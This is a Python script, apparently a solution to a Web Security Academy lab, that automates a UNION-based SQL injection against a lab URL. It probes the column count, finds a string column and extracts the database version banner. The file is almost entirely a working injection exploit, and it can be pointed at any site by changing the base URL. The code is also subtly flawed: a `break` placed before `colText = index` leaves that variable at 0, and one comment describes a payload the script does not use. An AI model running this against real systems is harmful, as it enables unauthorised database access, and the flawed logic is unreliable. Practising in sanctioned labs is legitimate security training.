import requests
import json
import urllib
from bs4 import BeautifulSoup

# Using the same script for Union attacks lab no 2.
# Few modifications to:
# Payload with 'Select NULL from DUAL' when testing for columns
# 
# URL of target

#modify here ---------
baseURL = "https://0a4d00c303b3946ec0018e83000e0012.web-security-academy.net"
MAX_TRIES = 10
#modify end ----------

# proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
exploitURL = baseURL + "/filter?category="

found = False;
col_index = 0  # counter for no. of columns

#--(1) detect columns--------------------------------------------------
print("Detecting no of columns with union attack...")


while(found == False):
	if col_index == MAX_TRIES:
		break
	payload = requests.utils.quote("' union select {}null#".format(col_index*'null,'))
	res = requests.get(url = exploitURL+payload)
	# res = requests.get(url = exploitURL+payload, proxies=proxies, verify=False)
	if (res.status_code == 200):
		found = True
		break
	else:
		col_index=col_index+1

col_count = col_index+1
print(" [+] Found! Total columns detected = {}\n".format(col_count))

#--(2) detect column with text--------------------------------------------------
print("2 Detecting column with text")
found = False
colText = 0 # counter for which column is string type

for index in range(col_count):
	array = ['null'] * col_count
	array[index] = "'TEXT'"
	stringWithComma = ",".join(array) 
	payload = requests.utils.quote("' union select {}#".format(stringWithComma))
	res = requests.get(url = exploitURL+payload)
	# res = requests.get(url = exploitURL+payload, proxies=proxies, verify=False)
	if res.status_code == 200:	
		print(" [+] Found! column index {} is a string type".format(index))
		break
		colText = index


#--(3) select banner from mysql mssql--------------------------------------------------
# ' union select banner, null from @@version--
print("\n3 Querying banner from @@version")
array = ['null'] * col_count
array[colText] = "@@version"
stringWithComma = ",".join(array)
payload = requests.utils.quote("' union select {}#".format(stringWithComma))
print('payload: {}'.format(payload))
html_content = requests.get(url = exploitURL+payload).text
# res = requests.get(url = exploitURL+payload, proxies=proxies, verify=False)
if "Congratulations" in html_content:
	print(" [+] 'Congratulations' is found in response!")
	soup = BeautifulSoup(html_content, "html.parser")
	table = soup.find('table', class_='is-table-longdescription')
	for row in table.tbody.find_all('tr'):
		bannerText = row.find('th').text.strip()
		print(" [+] Printing database version: {}".format(bannerText))
		